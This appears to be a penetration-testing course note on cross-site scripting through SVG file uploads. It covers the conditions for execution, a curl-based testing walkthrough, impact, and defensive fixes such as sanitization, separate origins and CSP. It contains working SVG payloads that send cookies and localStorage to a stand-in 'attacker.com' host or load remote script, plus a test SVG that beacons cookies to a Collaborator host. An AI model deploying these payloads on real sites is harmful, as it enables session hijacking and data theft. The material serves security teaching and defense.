---
tags: [vapt, file-upload, xss, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.09 File Upload + XSS (SVG with XSS payload)"
---

# 22.09 — File Upload + XSS (SVG with XSS payload)

## Why SVG Enables XSS

```
SVG = XML format that supports JavaScript!
  <script> tags are valid in SVG
  Event handlers work: onload, onclick, onerror, etc.
  
  IF SVG IS SERVED WITH:
  Content-Type: image/svg+xml (or text/html)
  
  AND: served from the SAME ORIGIN as the main app
  
  → JavaScript in SVG executes in user's browser!
  → Same-origin → JavaScript can access cookies, DOM, make authenticated requests!
  
  UNLIKE PNG/JPEG:
  PNG/JPEG: can't embed executable code (just pixel data)
  SVG: XML with JavaScript → code executes!
```

---

## SVG XSS Payloads

```xml
<!-- SIMPLE ALERT (PoC): -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

<!-- ONLOAD EVENT: -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
</svg>

<!-- ANIMATE TAG HACK: -->
<svg xmlns="http://www.w3.org/2000/svg">
  <animate attributeName="x" from="alert(1)" to="alert(2)" dur="1s" 
           begin="0s" onbegin="eval(atob('YWxlcnQoMSk='))"/>
</svg>

<!-- COOKIE THEFT (actual attack): -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    var img = new Image();
    img.src = 'https://attacker.com/?cookie=' + encodeURIComponent(document.cookie);
  </script>
</svg>

<!-- SESSION HIJACK (complete): -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookie: document.cookie,
        storage: JSON.stringify(localStorage),
        url: window.location.href,
        referrer: document.referrer
      })
    });
  </script>
</svg>

<!-- CSP BYPASS ATTEMPT — external script: -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script href="https://attacker.com/evil.js"/>
</svg>

<!-- URL-BASED XSS (if file URL contains params and it's rendered in browser): -->
https://target.com/uploads/test.svg#<script>alert(1)</script>
```

---

## Conditions for XSS via SVG

```
CONDITION 1: SAME-ORIGIN SERVING
  File served at: https://target.com/uploads/file.svg
  Main app at: https://target.com/
  → Same origin (target.com) → cookies accessible!
  
  If CDN: https://cdn.example.com/uploads/file.svg
  Main app: https://target.com/
  → Different origin → JS can't access cookies (cross-origin!)
  
CONDITION 2: CONTENT-TYPE MATTERS
  Response: Content-Type: image/svg+xml → browser renders and executes JS!
  Response: Content-Type: image/png → browser sees wrong type → might not execute
  Response: Content-Type: text/html → definitely executes JS
  Response: Content-Type: application/octet-stream → download, not execute
  
CONDITION 3: HOW IS THE SVG DISPLAYED?
  <img src="/uploads/file.svg"> → img tag: DOES NOT execute JS in SVG!
  <object data="/uploads/file.svg"> → object tag: EXECUTES JS!
  <embed src="/uploads/file.svg"> → embed tag: EXECUTES JS!
  Directly visiting URL: https://target.com/uploads/file.svg → EXECUTES JS!
  
THEREFORE:
  If admin views the profile picture (which is SVG) → admin's cookies stolen!
  If file is shared via "view" link that shows the SVG → XSS!
```

---

## Testing SVG XSS

```bash
# STEP 1: CREATE MALICIOUS SVG:
cat > xss_test.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Simple PoC:
    document.title = 'XSS-by-SVG-Upload';
    var img = new Image();
    img.src = 'https://BURP_COLLABORATOR.oastify.com/xss?c=' + encodeURIComponent(document.cookie);
  </script>
</svg>
EOF

# STEP 2: UPLOAD:
curl -X POST https://target.com/upload-profile \
  -b "session=YOUR_SESSION" \
  -F "file=@xss_test.svg;type=image/svg+xml"

# STEP 3: FIND THE URL OF THE UPLOADED FILE:
# Check response, check profile page img src

# STEP 4: VISIT THE SVG DIRECTLY:
# https://target.com/uploads/YOUR_UUID.svg
# → If JavaScript executes → XSS confirmed!

# STEP 5: CHECK IF COOKIES ACCESSIBLE:
# Check Burp Collaborator: did browser send cookies?
# document.title change visible? → confirms JS ran!

# STEP 6: TEST HOW IT'S DISPLAYED:
# Does the app display profile picture via:
# <img> tag → no JS execution (usually)
# Direct link → visit link → JS executes
# <object> or <embed> → JS executes
# Admin views → admin's cookies stolen!
```

---

## Impact Escalation

```
STORED XSS VIA SVG → PERSISTENT!

SCENARIO:
  User uploads profile picture as SVG with XSS payload
  Admin views user's profile (to moderate, review, etc.)
  Admin's browser executes the SVG JavaScript
  → Admin's session cookie stolen → attacker logs in as admin!
  
  OR:
  File shared publicly → every viewer → XSS fires!
  → Mass cookie theft!
  
  WHAT XSS CAN DO ON SAME-ORIGIN:
  - Steal cookies (if no HttpOnly)
  - Make authenticated requests (CSRF bypass — same-origin!)
  - Read DOM content (other users' data visible on page)
  - Redirect to phishing site
  - Keylog user's inputs
  - Crypto mining in background
```

---

## Fix

```
PREVENTING XSS VIA SVG UPLOAD:

1. DON'T ALLOW SVG UPLOADS (if not needed):
   Remove SVG from allowed file types!
   For profile pictures: only allow JPEG/PNG/GIF/WebP

2. SERVE FROM DIFFERENT ORIGIN:
   Host user uploads on separate domain: static.example.com
   Main app: example.com
   → XSS from SVG can't access example.com cookies!

3. SERVE WITH RESTRICTIVE CONTENT-DISPOSITION:
   Add to upload serving:
   Content-Disposition: attachment; filename="file.svg"
   → Forces download instead of rendering → no JS execution!
   
   # Nginx:
   location /uploads/ {
     add_header Content-Disposition "attachment";
   }

4. SET X-CONTENT-TYPE-OPTIONS:
   X-Content-Type-Options: nosniff
   → Prevents MIME-type sniffing
   → SVG served as image/svg+xml won't be misinterpreted
   
   But: if explicitly image/svg+xml → JS still runs!

5. SANITIZE SVG ON UPLOAD:
   Strip scripts and event handlers from SVG:
   
   Python:
   from lxml import etree
   
   def sanitize_svg(svg_content):
       parser = etree.XMLParser(resolve_entities=False)
       tree = etree.fromstring(svg_content.encode(), parser)
       
       # Remove all script tags and event handler attributes:
       for element in tree.iter():
           # Remove script elements:
           if element.tag.endswith('script'):
               element.getparent().remove(element)
           # Remove event attributes (onload, onclick, etc.):
           for attr in list(element.attrib.keys()):
               if attr.startswith('on') or 'javascript:' in element.attrib.get(attr, ''):
                   del element.attrib[attr]
       
       return etree.tostring(tree)
   
   # Or use DOMPurify (JavaScript) for client-side SVG processing
   # Or svg-sanitizer library (PHP)

6. CONTENT SECURITY POLICY:
   Content-Security-Policy: default-src 'self'; script-src 'none';
   → Even if SVG served same-origin, CSP blocks inline scripts!
   → Strong CSP is defense in depth
```

---

## Related Notes
- [[08 - File Upload + SSRF (SVG with SSRF payload)]] — SVG SSRF
- [[07 - XSS — Stored XSS]] — XSS module context
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
